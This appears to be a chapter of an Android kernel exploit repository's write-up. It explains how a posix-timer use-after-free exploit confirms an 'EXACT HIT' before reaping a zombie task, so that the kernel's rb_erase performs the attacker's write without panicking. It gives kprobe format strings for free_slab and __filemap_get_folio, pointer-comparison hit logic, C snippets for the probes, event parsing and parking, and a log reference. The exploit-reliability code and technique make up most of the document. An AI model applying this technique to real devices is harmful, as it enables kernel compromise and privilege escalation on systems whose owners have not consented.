# 08 · EXACT HIT: Confirm the Hit Before Acting

[中文](../08-exact-hit.md) · **English**

> This chapter explains why we kept crashing before, and what the correct approach is.
> **If you learn one technique from this repository, learn this one.**

---

## 1. Our earlier, wrong approach

```
create timer -> wait for zombie -> spray 234 MB -> * reap immediately *
                                                    |
                                                    v
                                       kernel timerqueue_del -> rb_erase
```

**Reaping is irreversible.**

- If we hit the target page → `rb_erase` reads our payload → write succeeds ✅
- If we missed → `rb_erase` reads garbage from the page, treats it as an `rb_node` and
  dereferences it → **panic** ❌

**So we were gambling a single hit against a ~50% crash rate.**

---

## 2. The correct approach (verbatim from the popsicle implementation)

> The implementation first puts the timer object into a trackable slab, then waits for the
> target task to enter a controllable zombie state.
> The source observes **RCU callbacks** and `free_slab` to confirm that the free event
> belongs to **the same target slab**, and only then tries to reclaim the target page with a
> mappable kernel page.
> **The zombie is only allowed to be reaped when the mapping genuinely covers the previously
> recorded target node**, letting the kernel's tree-cleanup path perform the intended write.
>
> The key here is **not increasing blind allocation volume**, but chaining
> "target object address → slab → physical page → new mapping → final write" into a single
> evidence chain.
> The **`EXACT HIT`** marker, target PFN and node offset in the log explain why a given
> attempt may proceed.
> **When the precise hit is missing, the program prints `PARKED` and preserves the dangerous
> state**; reaping or forcing a retry in the same boot may crash the kernel.

**Core idea: postpone the irreversible action until you have evidence.**

---

## 3. Three kinds of "hit criteria"

### 3.1 Method A: PFN comparison (what popsicle uses)

```
1. kprobe free_slab to obtain the freed slab's struct page*
   "p:grp/ev free_slab cache=%x0:x64 slab=%x1:x64"

2. convert to a PFN
   target_pfn = (wanted_slab - TARGET_VMEMMAP_START) / 0x40 + MEMSTART_PFN

3. get our own PFN from the AIO page's folio
   "r:grp/folio __filemap_get_folio folio=$retval:x64"

4. compare
   if (our_pfn == target_pfn) -> EXACT HIT
```

### 3.2 Method B: **compare pointers directly** (our simplified version, cleaner)

**Key insight:**

- `free_slab(x0 = struct kmem_cache *s, x1 = struct slab *slab)`
- `__filemap_get_folio(...)` returns `struct folio *`
- In 6.6, `struct slab *` and `struct folio *` **are both aliases of `struct page *`**

**So the pointers can be compared directly, with no vmemmap / page_offset arithmetic at all:**

```c
hit condition:
    folio == slab          /* we got the first 4 KB of the 8 KB slab */
or  folio == slab + 64     /* the second 4 KB (sizeof(struct page) = 64) */
```

**Which half we need is decided by `victim & 0x1fff >= 4096`.**

**That removes three constants that could otherwise be wrong.**

#### How the argument order was confirmed

Disassembling `free_slab`:

```asm
0xffffffc080383240  paciasp
0xffffffc08038325c  ldrb  w8, [x0, #0xa]     ; read s->flags => x0 is kmem_cache
0xffffffc080383280  add   x0, x1, #0x10      ; use slab+0x10 => x1 is slab
```

**⇒ the format string `free_slab cache=%x0:x64 slab=%x1:x64` is correct.**

### 3.3 Method C: Shark's `burst hit` (the one that actually worked)

Shark uses a third approach; the log looks like:

```
[+] plant1 free_seen=1 burst hit=1 after 48ms
```

- `free_seen` — whether the target slab's free was observed
- `burst hit` — whether our allocations hit within a short window after the free
- **only `hit=1` proceeds to reaping**

A failing log:

```
[+] plant1 free_seen=1 burst hit=0 after 3093ms
[-] plant1 burst missed; holding zombie
```

**`holding zombie` — keep the zombie, do not reap, rename itself to a "holder", wait for the
next attempt.**

---

## 4. How we would implement it (incomplete, for reference)

We wrote the tooling but never wired it into the main flow (Shark already has a better
implementation).

### 4.1 Create the probes

```c
static void make_probes(void)
{
    write_file("/sys/kernel/tracing/kprobe_events",
        "p:probe98260/free_slab free_slab cache=%x0:x64 slab=%x1:x64\n");
    write_file("/sys/kernel/tracing/kprobe_events",
        "r:probe98260/folio __filemap_get_folio folio=$retval:x64\n");
}
```

### 4.2 Read the events

```c
/* parse from /sys/kernel/tracing/trace */
static int parse_events(const char *buf, uint64_t *slab, uint64_t *folio)
{
    /* free_slab: ... slab=0xffff... */
    /* folio:     ... folio=0xffff... */
}
```

### 4.3 Decide the hit

```c
uint32_t off_in_slab = victim & 0x1fff;
int want_tail = (off_in_slab >= 4096);

if (slab_out && folio_out) {
    if (!want_tail && *folio_out == *slab_out)
        return 1;                                   /* EXACT HIT, first half */
    if (want_tail && *folio_out == *slab_out + 64)
        return 1;                                   /* EXACT HIT, second half */
}
return 0;
```

### 4.4 If no hit, PARKED

```c
if (!exact_hit) {
    log("PARKED");
    /* keep the zombie, never reap */
    park_forever();
}
```

---

## 5. A zero-risk validation tool

We wrote a tool that **does not trigger the UAF at all** and only validates the tracefs path:

```console
$ adb push tools/trace_probe.c  # after compiling
$ adb shell /data/local/tmp/trace_probe 512 256
```

It does three things:

| Step | What it validates |
|---|---|
| write two probes into `kprobe_events` | whether kprobes can be created under the current SELinux state |
| create/destroy 512 posix timers | whether `free_slab` catches our cache |
| create 256 AIO contexts | whether `__filemap_get_folio` returns folio pointers |

**Three possible outcomes, corresponding to three paths:**

```
1. probes cannot be created   -> switch observation mechanism (e.g. kmem_cache_free tracepoint)
2. created but no events      -> move the hook point
3. both event types captured  -> safe to wire into the main flow
```

**This is a validation you can safely run at any stage.**

---

## 6. Why this idea is valuable

| | blind reap | EXACT HIT |
|---|---|---|
| on hit | success | success |
| on miss | **panic** | **PARKED, no crash** |
| retryability | must restart everything after a crash | can continue in the same boot |
| observability | only success/crash | `free_seen` / `hit` / `PARKED` in the log |

**That is why, after fixing the KASLR bug, we ran six times with zero panics — Shark's
`PARKED` mechanism saved us.**

---

## 7. Log quick reference

| Log | Meaning | Action |
|---|---|---|
| `free_seen=1 burst hit=1` | precise hit | continue, reap happens |
| `free_seen=1 burst hit=0` | free seen but page not reclaimed | `PARKED`, re-run |
| `free_seen=0` | free not seen | check probes / whether the trigger worked |
| `holding zombie` | zombie retained | normal, next attempt may proceed |
| `PARKED=1` | parked | re-run |
| `FAIL=xxx REASON=xxx` | failure | the tag tells you which stage |
